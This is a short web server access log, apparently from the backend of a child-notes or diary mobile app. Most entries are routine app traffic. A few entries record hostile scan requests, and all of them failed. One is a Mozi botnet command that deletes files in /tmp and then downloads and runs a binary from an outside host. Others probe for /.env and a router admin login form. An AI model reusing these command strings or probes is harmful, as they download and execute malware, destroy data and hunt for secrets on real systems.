211.216.240.221 - - [26/Mar/2021:06:00:36 +0000] "GET /media/images/2021/03/25/%EB%82%B4_%EC%82%AC%EC%A7%84_Jy4jjh2.jpg HTTP/1.1" 200 37551 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:05:41 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:06:43 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:06:45 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
223.63.187.145 - - [26/Mar/2021:06:07:05 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:07:09 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:08:16 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
211.216.240.221 - - [26/Mar/2021:06:08:41 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
175.203.81.8 - - [26/Mar/2021:06:20:10 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
1.245.233.122 - - [26/Mar/2021:06:20:32 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
1.245.233.122 - - [26/Mar/2021:06:21:28 +0000] "GET /notes/?child=10&year=2021&month=03 HTTP/1.1" 200 8664 "-" "okhttp/3.12.12"
59.93.21.184 - - [26/Mar/2021:06:52:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.93.21.184:57635/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 3019 "-" "Hello, world"
125.138.109.142 - - [26/Mar/2021:07:34:44 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 174 "-" "PostmanRuntime/7.26.10"
34.239.240.149 - - [26/Mar/2021:07:49:23 +0000] "GET /.env HTTP/1.1" 404 1100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.239.240.149 - - [26/Mar/2021:07:49:23 +0000] "POST / HTTP/1.1" 404 1089 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.33.74 - - [26/Mar/2021:08:42:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 1119 "http://3.36.120.95:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.33.74 - - [26/Mar/2021:08:42:46 +0000] "" 400 0 "-" "-"
223.63.187.145 - - [26/Mar/2021:08:57:55 +0000] "GET /notes/stat/used_words/cloud/?child=10 HTTP/1.1" 404 1175 "-" "PostmanRuntime/7.26.10"
175.203.81.8 - - [26/Mar/2021:08:59:14 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 99 "-" "PostmanRuntime/7.26.10"
223.63.187.145 - - [26/Mar/2021:09:00:58 +0000] "GET /notes/stat/used_words/cloud/?child=10 HTTP/1.1" 404 1175 "-" "PostmanRuntime/7.26.10"
223.63.187.145 - - [26/Mar/2021:09:07:27 +0000] "GET /notes/stat/used_words/cloud/?child=10 HTTP/1.1" 200 106276 "-" "PostmanRuntime/7.26.10"
125.138.109.142 - - [26/Mar/2021:09:10:35 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 100 "-" "okhttp/3.12.12"
175.203.81.8 - - [26/Mar/2021:09:11:30 +0000] "GET /images/2021/03/26/rn_image_picker_lib_temp_df492a3e-cf16-4eb5-b549-c7b1524103b7_Vb6qfGN.jpg HTTP/1.1" 404 1182 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
175.203.81.8 - - [26/Mar/2021:09:11:35 +0000] "GET /media/images/2021/03/26/rn_image_picker_lib_temp_df492a3e-cf16-4eb5-b549-c7b1524103b7_Vb6qfGN.jpg HTTP/1.1" 200 317178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
125.138.109.142 - - [26/Mar/2021:09:11:58 +0000] "POST /notes/diary/?child=10 HTTP/1.1" 201 94 "-" "okhttp/3.12.12"
